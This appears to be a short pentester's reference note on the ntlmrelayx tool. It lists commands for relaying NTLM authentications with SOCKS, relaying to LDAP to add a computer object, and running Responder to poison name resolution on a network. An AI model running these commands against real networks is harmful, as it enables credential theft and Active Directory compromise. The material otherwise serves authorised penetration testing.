---
tags:
  - tool
  - active_directory
---
# ntlmrelayx

For every connection received, this module will try to relay that connection to specified target(s) system or the original client

## Capabilities

```powershell
# Multi relay from target file gathered with netexec, holding authentications with socks
sudo ntlmrelayx.py -tf relay_targets.txt -smb2support -socks

# Add computer object (responder HTTP and SMB turned off)
sudo ntlmrelayx.py -t ldap://$IP -smb2support --no-da --no-acl --add-computer '$NEW_COMPUTER'

# Start responder to poison requests
sudo responder -I tun0
```

REDACTED THEORY
